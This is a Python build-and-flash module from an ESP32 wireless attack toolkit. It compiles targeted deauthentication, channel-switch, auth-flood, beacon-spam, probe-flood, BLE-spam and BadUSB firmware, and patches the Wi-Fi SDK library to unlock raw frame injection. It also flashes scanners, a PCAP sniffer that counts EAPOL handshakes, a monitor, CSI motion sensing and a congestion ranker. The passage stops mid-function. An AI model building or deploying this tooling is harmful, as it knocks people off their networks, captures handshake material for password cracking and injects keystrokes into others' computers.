"""
esp_build — build (arduino-cli) and flash (arduino-cli/esptool) for esp-hw.

Chip-aware: detects the target (from --chip or by probing --port), patches the
matching libnet80211.a with the matching architecture's bytes in a private SDK
view, then compiles with the matching FQBN. The installed Arduino core is never
modified.
Nothing is mocked; graceful non-zero rc when a tool or board is absent.
"""
import fcntl
import os, shutil, subprocess, glob, tempfile, types, time
import esp_hw as H

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_SKETCH = os.path.join(HERE, "medusa_deauth")
ATTACK_SKETCH = {"deauth": "medusa_deauth", "csa": "medusa_csa", "authflood": "medusa_authflood",
                 "beaconspam": "medusa_beaconspam", "probeflood": "medusa_probeflood",
                 "blespam": "medusa_blespam",
                 "badusb": "medusa_badusb", "unattended": "medusa_unattended"}

# These firmwares use only public SDK facilities and must never carry the
# libnet80211 patch. Keep the policy here as well as in callers so direct CLI
# use cannot accidentally produce a patched unattended build.
STOCK_ONLY_ATTACKS = {"unattended"}

# Target headers and caller-selected output directories are shared mutable build
# inputs, so every build process still takes one lock. Patched builds themselves
# use a hard-linked private SDK view with only libnet80211.a replaced; this keeps
# the installed core stock even if Python or arduino-cli is interrupted.
BUILD_LOCK_DIR = os.path.expanduser("~/Library/Caches/medusa")
BUILD_LOCK_PATH = os.environ.get(
    "MEDUSA_BUILD_LOCK", os.path.join(BUILD_LOCK_DIR, "esp-build.lock")
)

# BLE manufacturer company IDs (little-endian in adv) → vendor
BLE_COMPANY = {
    0x004C: "Apple", 0x0006: "Microsoft", 0x0075: "Samsung", 0x00E0: "Google",
    0x0059: "Nordic", 0x0087: "Garmin", 0x0157: "Huawei", 0x038F: "Xiaomi",
    0x02E5: "Espressif", 0x0499: "Ruuvi", 0x004F: "Bose", 0x0110: "SGL",
}


def _arduino_cli():
    return shutil.which("arduino-cli")


def _resolve_chip(a):
    if getattr(a, "chip", None):
        return a.chip
    if getattr(a, "port", None):
        H.say(f"detecting chip on {a.port} …", "d")
        chip = H.detect_chip(a.port)
        if chip:
            H.say(f"detected {chip}", "g")
            return chip
    return "esp32"


def _link_or_copy(src, dst):
    """Hard-link SDK files when source/temp share a volume; copy otherwise."""
    try:
        os.link(src, dst)
    except OSError:
        shutil.copy2(src, dst)


def build(a):
    os.makedirs(os.path.dirname(BUILD_LOCK_PATH) or ".", mode=0o700, exist_ok=True)
    with open(BUILD_LOCK_PATH, "a+") as lock_file:
        fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX)
        try:
            return _build_locked(a)
        finally:
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_UN)


def _build_locked(a):
    cli = _arduino_cli()
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip} (known: {', '.join(H.ARCHES)})", "r"); return 2
    attack = getattr(a, "attack", None) or "deauth"
    no_patch = getattr(a, "no_patch", False)
    if attack in STOCK_ONLY_ATTACKS:
        targeted = (
            getattr(a, "bssid", None), getattr(a, "channel", None),
            getattr(a, "client", None), getattr(a, "ssid", None),
            getattr(a, "payload", None),
        )
        if any(value is not None for value in targeted):
            H.say("unattended is passive capture/storage and accepts no target or payload arguments.", "r")
            return 2
        if not no_patch:
            H.say("unattended is STOCK-only; forcing --no-patch.", "y")
        no_patch = True
    fqbn = a.fqbn or arch["fqbn"]
    if attack == "badusb" and not a.fqbn:
        if chip != "esp32-s3":
            H.say("badusb needs USB-OTG HID — build --chip esp32-s3 (C3/C6 are serial-JTAG only).", "r"); return 2
        fqbn = arch["fqbn"] + ":USBMode=default"       # TinyUSB so HID enumerates
    core_lib = H.find_core_lib(arch["target"])
    sketch = a.sketch or os.path.join(HERE, ATTACK_SKETCH.get(attack, "medusa_deauth"))
    out = a.out or f"/tmp/medusa_{attack}_{arch['target']}"

    if not no_patch and not core_lib:
        H.say(f"No libnet80211.a for {arch['target']} under ~/Library/Arduino15.", "r")
        H.say(f"Install a core that supports it (e.g. arduino-cli core install esp32:esp32).", "y")
        return 2
    if not os.path.isdir(sketch):
        H.say(f"sketch dir not found: {sketch}", "r"); return 2

    H.say(f"chip      : {chip}", "d")
    H.say(f"core blob : {core_lib if not no_patch else 'stock / untouched'}", "d")
    H.say(f"fqbn      : {fqbn}", "d")
    H.say(f"build dir : {out}", "d")

    bssid = getattr(a, "bssid", None)
    channel = getattr(a, "channel", None)
    client = getattr(a, "client", None)
    ssid = getattr(a, "ssid", None)
    payload = getattr(a, "payload", None)
    # Plain NAME=VALUE build-time switches for sketches that have a mode rather
    # than a target — medusa_ftm's responder role, for one. Routed through the
    # same generated header as everything else so there is exactly one place a
    # build-time constant can come from.
    extra_defines = list(getattr(a, "extra_defines", None) or [])
    target_hdr = os.path.join(sketch, "medusa_target.h")
    isolated_sdk = None
    sdk_override = None
    try:
        # A prior process may have been terminated after writing this generated
        # header. Remove it before deciding whether this build needs a target.
        if os.path.exists(target_hdr):
            os.remove(target_hdr)
        if no_patch:
            H.say("STOCK build (--no-patch): core blob left untouched.", "y")
        else:
            sdk_source = os.path.dirname(os.path.dirname(core_lib))
            isolated_sdk = tempfile.TemporaryDirectory(prefix=f"medusa-sdk-{arch['target']}-")
            sdk_override = os.path.join(isolated_sdk.name, os.path.basename(sdk_source))
            # The linker only reads SDK contents. Hard links make the private
            # view fast and space-efficient; unlinking the one target library
            # before patching guarantees the installed inode is never written.
            shutil.copytree(sdk_source, sdk_override, symlinks=True, copy_function=_link_or_copy)
            isolated_core = os.path.join(sdk_override, os.path.relpath(core_lib, sdk_source))
            os.remove(isolated_core)
            res = H.patch_lib(core_lib, isolated_core, arch, verbose=True)
            if not res["ok"]:
                H.say("patch verify failed — aborting isolated build, installed core untouched.", "r"); return 1
            H.say("patched private SDK view activated; installed core untouched.", "g")

        # Write medusa_target.h from whatever fields are given — bssid/channel/
        # client/ssid/payload are all independent, so broadcast tools (beacon spam,
        # probe flood) can pin just a channel/SSID and BadUSB (no-patch) can carry a
        # payload. Discovery helpers pass these values into build() so header
        # creation, compilation, and cleanup all stay inside the build lock.
        if (bssid or channel is not None or client or ssid is not None or payload or extra_defines):
            lines = []
            for name, value in (getattr(a, "string_defines", None) or {}).items():
                esc = str(value).replace("\\", "\\\\").replace('"', '\\"')
                lines.append(f'#define {name} "{esc}"')
            for item in extra_defines:
                name, _, value = str(item).partition("=")
                name = name.strip()
                # A malformed define that silently does nothing would let a
                # responder build come up as an initiator and look fine, so
                # this refuses rather than skips.
                if not name.replace("_", "").isalnum():
                    H.say(f"invalid build define: {item}", "r"); return 2
                lines.append(f"#define {name} {value.strip() or '1'}")
            if channel is not None:
                lines.append(f"#define TARGET_CHANNEL {int(channel)}")
            if bssid:
                parts = bssid.split(":")
                if len(parts) != 6:
                    H.say(f"invalid BSSID: {bssid}", "r"); return 2
                lines.append("#define TARGET_BSSID { " + ", ".join("0x" + p for p in parts) + " }")
            if client:
                cp = client.split(":")
                if len(cp) != 6:
                    H.say(f"invalid client MAC: {client}", "r"); return 2
                lines.append("#define TARGET_CLIENT { " + ", ".join("0x" + p for p in cp) + " }")
            if ssid is not None:
                esc = ssid.replace("\\", "\\\\").replace('"', '\\"')
                lines.append(f'#define TARGET_SSID "{esc}"')
            if payload:
                esc = payload.replace("\\", "\\\\").replace('"', '\\"')
                lines.append(f'#define TARGET_PAYLOAD "{esc}"')
            with open(target_hdr, "w") as fh:
                fh.write("\n".join(lines) + "\n")
            tgt = bssid or (f"ch {channel}" if channel is not None else (f"ssid '{ssid}'" if ssid else "broadcast"))
            H.say(f"targeted build: {tgt}{' client ' + client if client else ''} (LAWFUL USE)", "y")

        if not cli:
            H.say("arduino-cli not installed — cannot compile.", "y")
            H.say(f"Then: arduino-cli compile --fqbn {fqbn} --build-path {out} {sketch}", "y")
            return 3
        os.makedirs(out, exist_ok=True)
        cmd = [cli, "compile", "--fqbn", fqbn, "--build-path", out, "--export-binaries", sketch]
        if sdk_override:
            cmd[2:2] = ["--build-property", f"compiler.sdk.path={sdk_override}"]
        H.say("compiling: " + " ".join(cmd), "b")
        r = subprocess.run(cmd)
        if r.returncode != 0:
            H.say("arduino-cli compile failed (see output above).", "r"); return r.returncode
    finally:
        if os.path.exists(target_hdr):
            os.remove(target_hdr)
        if isolated_sdk:
            isolated_sdk.cleanup()

    bins = sorted(glob.glob(os.path.join(out, "*.ino.bin")))
    H.say("BUILD OK", "g")
    for b in bins:
        print("  ", b)
    print(f"\nFlash it:  python3 esp_hw.py flash --port <PORT> --chip {chip} --build-dir {out}")
    return 0


def flash(a):
    port = H.resolve_port(a.port)
    if not port or not os.path.exists(port):
        H.say(f"port not found: {a.port} — plug the ESP in over USB and re-scan.", "r"); return 2
    if port != a.port:
        H.say(f"port re-resolved {a.port} -> {port}", "d")
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip, H.ARCHES["esp32"])
    fqbn = a.fqbn or arch["fqbn"]
    cli = _arduino_cli()

    if a.build_dir and cli:
        cmd = [cli, "upload", "-p", port, "--fqbn", fqbn, "--input-dir", a.build_dir]
        H.say("uploading: " + " ".join(cmd), "b")
        return subprocess.run(cmd).returncode

    esptool = H.find_esptool()
    if a.bin and esptool:
        off = "0x0" if chip != "esp32" else "0x10000"
        cmd = [esptool, "--port", port, "--baud", a.baud, "write-flash", off, a.bin]
        H.say("flashing: " + " ".join(cmd), "b")
        return subprocess.run(cmd).returncode

    H.say("Nothing to flash. Give --build-dir (arduino-cli) or --bin (esptool).", "r")
    return 2


def _decode_hex_text(encoded, max_bytes):
    """Decode a bounded, delimiter-safe firmware text field."""
    import re
    if not isinstance(encoded, str) or len(encoded) % 2 or len(encoded) > max_bytes * 2:
        return None
    if not re.fullmatch(r"[0-9a-fA-F]*", encoded):
        return None
    try:
        return bytes.fromhex(encoded).decode("utf-8", "replace")
    except ValueError:
        return None


def _parse_apscan_output(output):
    """Return (APs, complete) from one versioned, count-checked scan cycle."""
    import re
    completed = None
    active = None
    for line in (output or "").splitlines():
        fields = line.split("\t")
        if fields == ["APSCAN_BEGIN", "2"]:
            active = {"valid": True, "rows": []}
            continue
        if fields[:1] == ["APSCAN_END"]:
            if (active is not None and len(fields) == 4 and fields[1:3] == ["2", "OK"]):
                try:
                    expected = int(fields[3])
                except ValueError:
                    expected = -1
                if active["valid"] and expected == len(active["rows"]):
                    completed = active["rows"]
            active = None
            continue
        if active is None or fields[:1] != ["AP2"]:
            continue
        if len(fields) != 5:
            active["valid"] = False
            continue
        bssid = fields[1].strip().upper()
        ssid = _decode_hex_text(fields[4], 32)
        try:
            channel, rssi = int(fields[2]), int(fields[3])
        except ValueError:
            active["valid"] = False
            continue
        if (not re.fullmatch(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid)
                or not 1 <= channel <= 14 or not -127 <= rssi <= 0 or ssid is None):
            active["valid"] = False
            continue
        active["rows"].append({"bssid": bssid, "channel": channel, "rssi": rssi, "ssid": ssid})

    if completed is None:
        return [], False
    best = {}
    for ap in completed:
        if ap["bssid"] not in best or ap["rssi"] > best[ap["bssid"]]["rssi"]:
            best[ap["bssid"]] = ap
    return sorted(best.values(), key=lambda item: item["rssi"], reverse=True), True


def _parse_blescan_output(output):
    """Return (devices, complete) from versioned, count-checked BLE cycles."""
    import re
    completed = []
    completed_cycle = False
    active = None
    for line in (output or "").splitlines():
        fields = line.split("\t")
        if fields == ["BLESCAN_BEGIN", "2"]:
            active = {"valid": True, "rows": []}
            continue
        if fields[:1] == ["BLESCAN_END"]:
            if (active is not None and len(fields) == 4 and fields[1:3] == ["2", "OK"]):
                try:
                    expected = int(fields[3])
                except ValueError:
                    expected = -1
                if active["valid"] and expected == len(active["rows"]):
                    completed.extend(active["rows"])
                    completed_cycle = True
            active = None
            continue
        if active is None or fields[:1] != ["BLE2"]:
            continue
        if len(fields) != 5:
            active["valid"] = False
            continue
        addr = fields[1].strip().lower()
        name = _decode_hex_text(fields[3], 512)
        manufacturer = fields[4]
        try:
            rssi = int(fields[2])
        except ValueError:
            active["valid"] = False
            continue
        if (not re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", addr)
                or not -127 <= rssi <= 20 or name is None
                or len(manufacturer) % 2 or len(manufacturer) > 1024
                or not re.fullmatch(r"[0-9a-fA-F]*", manufacturer)):
            active["valid"] = False
            continue
        vendor = ""
        company_id = None
        if len(manufacturer) >= 4:
            # Little-endian company identifier, per the Bluetooth Core spec's
            # Manufacturer Specific Data type.
            company_id = int(manufacturer[2:4] + manufacturer[0:2], 16)
            vendor = BLE_COMPANY.get(company_id, "")
        # Keep the raw advertisement bytes. Deriving a vendor and then throwing
        # the payload away loses the only evidence of what was actually
        # advertised, which is the thing an operator is trying to look at.
        active["rows"].append({
            "addr": addr,
            "rssi": rssi,
            "name": name,
            "vendor": vendor,
            "company_id": company_id,
            "manufacturer": manufacturer.lower(),
        })

    if not completed_cycle:
        return [], False
    best = {}
    for device in completed:
        if device["addr"] not in best or device["rssi"] > best[device["addr"]]["rssi"]:
            best[device["addr"]] = device
    return sorted(best.values(), key=lambda item: item["rssi"], reverse=True), True


def _parse_recon_output(output):
    """Return (AP profiles, complete) from a versioned complete firmware cycle."""
    import re
    completed = None
    active = None
    for line in (output or "").splitlines():
        fields = line.split("\t")
        if fields == ["RECON_BEGIN", "2"]:
            active = {"valid": True, "rows": []}
            continue
        if fields[:1] == ["RECON_END"]:
            if active is not None and len(fields) == 4 and fields[1:3] == ["2", "OK"]:
                try:
                    expected = int(fields[3])
                except ValueError:
                    expected = -1
                if active["valid"] and expected == len(active["rows"]):
                    completed = active["rows"]
            active = None
            continue
        if active is None or fields[:1] != ["RECON2"]:
            continue
        if len(fields) != 9:
            active["valid"] = False
            continue
        bssid = fields[1].strip().upper()
        ssid = _decode_hex_text(fields[8], 32)
        try:
            channel, rssi = int(fields[2]), int(fields[3])
        except ValueError:
            active["valid"] = False
            continue
        auth, pmf, wps, cipher = fields[4:8]
        if (not re.fullmatch(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid)
                or not 1 <= channel <= 14 or not -127 <= rssi <= 0 or ssid is None
                or auth not in {"OPEN", "WEP", "WPA1", "WPA2", "WPA2-PSK", "WPA3-SAE", "WPA2/WPA3"}
                or pmf not in {"none", "capable", "required"} or wps not in {"wps", "-"}
                or cipher not in {"-", "TKIP", "CCMP"}):
            active["valid"] = False
            continue
        ap = {"bssid": bssid, "channel": channel, "rssi": rssi, "auth": auth,
              "pmf": pmf, "wps": wps == "wps", "cipher": cipher,
              "ssid": ssid or "(hidden)"}
        ap["findings"] = _configuration_findings(ap)
        active["rows"].append(ap)

    if completed is None:
        return [], False
    best = {}
    for ap in completed:
        if ap["bssid"] not in best or ap["rssi"] > best[ap["bssid"]]["rssi"]:
            best[ap["bssid"]] = ap
    return sorted(best.values(), key=lambda item: item["rssi"], reverse=True), True


def _parse_clientscan_output(output):
    """Return (clients, complete) from a versioned, count-checked cycle."""
    import re
    completed = None
    active = None
    for line in (output or "").splitlines():
        fields = line.split("\t")
        if fields == ["CLIENTS_BEGIN", "2"]:
            active = {"valid": True, "rows": []}
            continue
        if fields[:1] == ["CLIENTS_END"]:
            if active is not None and len(fields) == 4 and fields[1:3] == ["2", "OK"]:
                try:
                    expected = int(fields[3])
                except ValueError:
                    expected = -1
                if active["valid"] and expected == len(active["rows"]):
                    completed = active["rows"]
            active = None
            continue
        if active is None or fields[:1] != ["CLIENT"]:
            continue
        if len(fields) != 4:
            active["valid"] = False
            continue
        mac = fields[1].strip().upper()
        try:
            rssi, packets = int(fields[2]), int(fields[3])
        except ValueError:
            active["valid"] = False
            continue
        if (not re.fullmatch(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", mac)
                or not -127 <= rssi <= 0 or not 0 <= packets <= 65535):
            active["valid"] = False
            continue
        active["rows"].append({"mac": mac, "rssi": rssi, "packets": packets})

    if completed is None:
        return [], False
    best = {}
    for client in completed:
        prior = best.get(client["mac"])
        if prior is None or client["packets"] > prior["packets"]:
            best[client["mac"]] = client
    return sorted(best.values(), key=lambda item: item["packets"], reverse=True), True


def scan_aps(a):
    """Flash a tiny scan firmware, read serial, and emit the nearby 2.4GHz APs.
    Prints a machine-readable `APSCAN_JSON {...}` line for callers to parse."""
    import json
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    with tempfile.TemporaryDirectory(prefix=f"medusa_apscan_{arch['target']}_") as out:
        bns = types.SimpleNamespace(chip=chip, port=None, sketch=os.path.join(HERE, "medusa_apscan"),
                                    out=out, fqbn=None, no_patch=True, bssid=None, channel=None)
        if build(bns) != 0:
            H.say("scan firmware build failed", "r"); return 1
        fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
        if flash(fns) != 0:
            H.say("scan firmware flash failed", "r"); return 1

        H.say("scanning nearby 2.4GHz APs…", "b")
        time.sleep(2)
        r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, "16"],
                           capture_output=True, text=True)
        aps, protocol_complete = _parse_apscan_output(r.stdout)
        complete = r.returncode == 0 and protocol_complete
        error = None if complete else ("serial reader failed" if r.returncode != 0 else "scan completion markers missing or invalid")
        if not complete:
            aps = []
            H.say(f"Wi-Fi survey readback failed: {error}", "r")
        payload = {"aps": aps, "flashed": True, "complete": complete}
        if error:
            payload["error"] = error
        print("APSCAN_JSON " + json.dumps(payload))
        if not complete:
            return 1
        H.say(f"found {len(aps)} AP(s)", "g")
        return 0


def write_pcap(path, packets, dlt=105):
    """Write a libpcap file. `packets` is a list of raw frame `bytes`.
    dlt 105 = LINKTYPE_IEEE802_11 (raw 802.11, no radiotap). Synthetic 1 ms
    timestamps from a base time — the firmware gives us order, not wall-clock."""
    import struct, time as _t
    base = int(_t.time())
    with open(path, "wb") as f:
        # global header: magic, ver 2.4, thiszone, sigfigs, snaplen, network(dlt)
        f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, dlt))
        for i, raw in enumerate(packets):
            sec = base + (i * 1000) // 1_000_000
            usec = (i * 1000) % 1_000_000
            f.write(struct.pack("<IIII", sec, usec, len(raw), len(raw)))
            f.write(raw)
    return path


def _is_eapol(raw):
    """True if a data frame carries EAPOL (LLC/SNAP ethertype 0x888E)."""
    if len(raw) < 26 or ((raw[0] >> 2) & 0x3) != 2:
        return False
    for i in range(24, min(len(raw) - 1, 40)):
        if raw[i] == 0x88 and raw[i + 1] == 0x8e:
            return True
    return False


def sniff(a):
    """Flash the passive sniffer, capture for a window, and write a PCAP.
    Emits `SNIFF_JSON {path, packets, eapol, ...}` for callers to parse."""
    import json, re, os as _os
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    channel = int(getattr(a, "channel", 0) or 0)
    if not (1 <= channel <= 14):
        H.say("sniff needs --channel 1-14 (capture pins one channel)", "r"); return 2
    seconds = int(getattr(a, "seconds", 0) or 20)
    sketch = os.path.join(HERE, "medusa_sniffer")
    out = tempfile.mkdtemp(prefix=f"medusa_sniffer_{arch['target']}_")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out,
                                fqbn=None, no_patch=True, bssid=None, channel=channel,
                                client=None, ssid=None, payload=None)
    if build(bns) != 0:
        H.say("sniffer firmware build failed", "r"); return 1   # build's finally removes the header
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("sniffer firmware flash failed", "r"); return 1

    H.say(f"capturing ch {channel} for {seconds}s (mgmt + EAPOL)…", "b")
    time.sleep(2)
    r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, str(seconds)],
                       capture_output=True, text=True)
    packets, eapol, runtime_health = [], 0, False
    for line in (r.stdout or "").splitlines():
        if re.fullmatch(r"STAT\tseen=\d+ sent=\d+ dropped=\d+", line):
            runtime_health = True
            continue
        p = line.split("\t")
        if len(p) >= 4 and p[0] == "PKT":
            try:
                raw = bytes.fromhex(p[3].strip())
            except ValueError:
                continue
            packets.append(raw)
            if _is_eapol(raw):
                eapol += 1
    complete = r.returncode == 0 and runtime_health
    if not complete:
        error = "serial reader failed" if r.returncode != 0 else "sniffer runtime health marker missing"
        H.say(f"packet-capture readback failed: {error}", "r")
        print("SNIFF_JSON " + json.dumps({"packets": 0, "eapol": 0, "channel": channel,
                                          "flashed": True, "complete": False, "error": error}))
        return 1
    path = _os.path.join("/tmp", f"medusa_capture_ch{channel}.pcap")
    write_pcap(path, packets)
    H.say(f"captured {len(packets)} frame(s), {eapol} EAPOL → {path}", "g")
    print("SNIFF_JSON " + json.dumps({"path": path, "packets": len(packets), "eapol": eapol,
                                      "channel": channel, "flashed": True, "complete": True}))
    return 0


def monitor(a):
    """Flash the passive traffic monitor, capture a window, and summarise frame
    counts by type (+ beacons/deauths) and the target BSSID's best RSSI.
    Emits `MONITOR_JSON {...}`."""
    import json, re
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    channel = int(getattr(a, "channel", 0) or 0)
    if not (1 <= channel <= 14):
        H.say("monitor needs --channel 1-14", "r"); return 2
    seconds = int(getattr(a, "seconds", 0) or 12)
    bssid = getattr(a, "bssid", None)
    sketch = os.path.join(HERE, "medusa_monitor")
    out = tempfile.mkdtemp(prefix=f"medusa_monitor_{arch['target']}_")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out, fqbn=None,
                                no_patch=True, bssid=bssid, channel=channel,
                                client=None, ssid=None, payload=None)
    if build(bns) != 0:
        H.say("monitor firmware build failed", "r"); return 1
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("monitor firmware flash failed", "r"); return 1

    H.say(f"monitoring ch {channel} for {seconds}s…", "b")
    time.sleep(2)
    r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, str(seconds)],
                       capture_output=True, text=True)
    agg = {"mgmt": 0, "data": 0, "ctrl": 0, "beacons": 0, "deauth": 0}
    best_rssi, samples = -128, 0
    for line in (r.stdout or "").splitlines():
        p = line.split("\t")
        if len(p) >= 8 and p[0] == "MON":
            try:
                if int(p[1]) != channel:
                    continue
                agg["mgmt"] += int(p[2]); agg["data"] += int(p[3]); agg["ctrl"] += int(p[4])
                agg["beacons"] += int(p[5]); agg["deauth"] += int(p[6])
                rs = int(p[7])
                if rs > -128: best_rssi = max(best_rssi, rs)
                samples += 1
            except ValueError:
                pass
    total = agg["mgmt"] + agg["data"] + agg["ctrl"]
    complete = r.returncode == 0 and samples > 0
    if not complete:
        error = "serial reader failed" if r.returncode != 0 else "monitor runtime samples missing"
        H.say(f"channel-monitor readback failed: {error}", "r")
        print("MONITOR_JSON " + json.dumps({"channel": channel, "seconds": 0, "total": 0,
                                            "target_rssi": None, **{key: 0 for key in agg},
                                            "flashed": True, "complete": False, "error": error}))
        return 1
    H.say(f"{total} frames in {samples}s (mgmt {agg['mgmt']} / data {agg['data']} / ctrl {agg['ctrl']}, deauth {agg['deauth']})", "g")
    print("MONITOR_JSON " + json.dumps({"channel": channel, "seconds": samples, "total": total,
                                        "target_rssi": (best_rssi if best_rssi > -128 else None), **agg,
                                        "flashed": True, "complete": True}))
    return 0


def csi(a):
    """Flash the CSI sensor, collect a window, and analyse it.

    The sketch measures the channel; medusa_csi_analyze decides what the
    measurements mean. Emits `CSI_JSON {...}`.

    Note the two failure modes that are NOT errors and must not be reported as
    such: an AP nobody is talking to produces almost no frames to measure, and
    a genuinely still room produces a flat motion trace. Both are findings.
    """
    import json
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    channel = int(getattr(a, "channel", 0) or 0)
    if not (1 <= channel <= 14):
        H.say("csi needs --channel 1-14", "r"); return 2
    seconds = int(getattr(a, "seconds", 0) or 60)
    bssid = getattr(a, "bssid", None)

    sketch = os.path.join(HERE, "medusa_csi")
    out = tempfile.mkdtemp(prefix=f"medusa_csi_{arch['target']}_")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out, fqbn=None,
                                no_patch=True, bssid=bssid, channel=channel,
                                client=None, ssid=None, payload=None)
    if build(bns) != 0:
        H.say("csi firmware build failed", "r"); return 1
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("csi firmware flash failed", "r"); return 1

    H.say(f"collecting CSI on ch {channel} for {seconds}s…", "b")
    if not bssid:
        H.say("no --bssid: every transmitter is tracked separately", "y")
    time.sleep(2)

    # Read with the project's own serial reader rather than pyserial, so this
    # matches monitor()/ftm() and carries no dependency the rest of the bridge
    # does not already have. An earlier version called the analyser's own
    # --port path; pyserial was absent, and because only stdout was inspected
    # the failure surfaced as "no CSI observed" — a tooling problem wearing the
    # costume of an empty channel. Capture to a file, then analyse the file.
    rd = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, str(seconds)],
                        capture_output=True, text=True)
    stream = rd.stdout or ""
    raw_path = getattr(a, "save", None) or os.path.join(out, "csi_stream.tsv")
    with open(raw_path, "w") as fh:
        fh.write(stream)
    if not stream.strip():
        H.say(f"nothing arrived on {a.port} — the board may still be resetting", "r")
        return 1

    cmd = ["python3", os.path.join(HERE, "medusa_csi_analyze.py"),
           "--replay", raw_path, "--json"]
    if getattr(a, "split_threshold", None):
        cmd += ["--split-threshold", str(a.split_threshold)]
    r = subprocess.run(cmd, capture_output=True, text=True)
    # A non-zero exit with no parseable stdout is the analyser failing, which is
    # a different thing from the analyser reporting that it saw nothing. Keeping
    # them distinct is the whole lesson of the bug above.
    try:
        result = json.loads(r.stdout or "")
    except ValueError:
        H.say("analyser did not return a result", "r")
        if r.stderr:
            H.say(r.stderr.strip().splitlines()[-1], "r")
        return 1

    for err in result.get("errors", []):
        H.say(f"firmware: {err}", "r")
    transmitters = result.get("transmitters", [])
    if not transmitters:
        # Distinguish "the feature is broken" from "nothing was there to hear".
        H.say("no CSI observed — the channel may be idle, or the BSSID filter matched nothing", "y")
        print("CSI_JSON " + json.dumps({"channel": channel, "seconds": seconds,
                                        "transmitters": [], "flashed": True, "complete": False}))
        return 1

    for t in transmitters:
        colour = "r" if t["finding"] == "MULTIPLE_POSITIONS" else ("y" if t["finding"] == "MOTION" else "g")
        H.say(f"{t['bssid']}  {t['finding']}  ({t['detail']})", colour)
    print("CSI_JSON " + json.dumps({"channel": channel, "seconds": seconds,
                                    "transmitters": transmitters,
                                    "info": result.get("info", []),
                                    "flashed": True, "complete": True}))
    return 0


#: 2.4 GHz channels are 22 MHz wide on 5 MHz spacing, so a channel is damaged by
#: its neighbours as well as by itself. Weight falls linearly to zero at five
#: channels apart, which is where the spectra stop overlapping — the reason 1, 6
#: and 11 are the classic non-overlapping set.
def _overlap_weight(a_ch, b_ch):
    d = abs(a_ch - b_ch)
    return max(0.0, (5.0 - d) / 5.0)


def score_channels(rows):
    """Rank channels by the air time that would actually interfere with you.

    Ranking on a channel's OWN occupancy alone is the mistake every router's
    auto-select makes: it recommends a channel that is quiet only because its
    neighbours are doing the shouting, and the user moves onto it and sees no
    improvement.
    """
    scored = []
    for target in rows:
        ch = target["channel"]
        interference = sum(_overlap_weight(ch, r["channel"]) * r["airtime_us"] for r in rows)
        neighbours = sum(r["networks"] for r in rows if _overlap_weight(ch, r["channel"]) > 0)
        retry_share = (target["retries"] / target["frames"]) if target["frames"] else 0.0
        scored.append({**target,
                       "interference_us": int(interference),
                       "overlapping_networks": neighbours,
                       "retry_share": round(retry_share, 3)})
    scored.sort(key=lambda r: r["interference_us"])
    return scored


def congestion(a):
    """Sweep the band and rank channels by interference. Emits `CONG_JSON {...}`."""
    import json
    if not H.resolve_port(a.port):
        H.say(f"port not found: {a.port}", "r"); return 2
    chip = _resolve_chip(a)
    arch = H.ARCHES.get(chip)
    if not arch:
        H.say(f"unsupported chip: {chip}", "r"); return 2
    sweeps = int(getattr(a, "sweeps", 0) or 3)
    dwell = int(getattr(a, "dwell", 0) or 1200)

    sketch = os.path.join(HERE, "medusa_congestion")
    out = tempfile.mkdtemp(prefix=f"medusa_congestion_{arch['target']}_")
    bns = types.SimpleNamespace(chip=chip, port=None, sketch=sketch, out=out, fqbn=None,
                                no_patch=True, bssid=None, channel=None,
                                client=None, ssid=None, payload=None,
                                extra_defines=[f"CONG_SWEEPS={sweeps}", f"CONG_DWELL_MS={dwell}"])
    if build(bns) != 0:
        H.say("congestion firmware build failed", "r"); return 1
    fns = types.SimpleNamespace(port=a.port, chip=chip, bin=None, build_dir=out, fqbn=None, baud="460800")
    if flash(fns) != 0:
        H.say("congestion firmware flash failed", "r"); return 1

    total_s = int((sweeps * 13 * dwell) / 1000) + 8
    H.say(f"sweeping 13 channels x{sweeps} ({total_s}s)…", "b")
    time.sleep(2)
    r = subprocess.run(["python3", os.path.join(HERE, "read_serial.py"), a.port, str(total_s)],
                       capture_output=True, text=True)

    rows = []
    for line in (r.stdout or "").splitlines():
        p = line.split("\t")
        if len(p) >= 7 and p[0] == "CONG":
            try:
                rows.append({"channel": int(p[1]), "frames": int(p[2]), "airtime_us": int(p[3]),
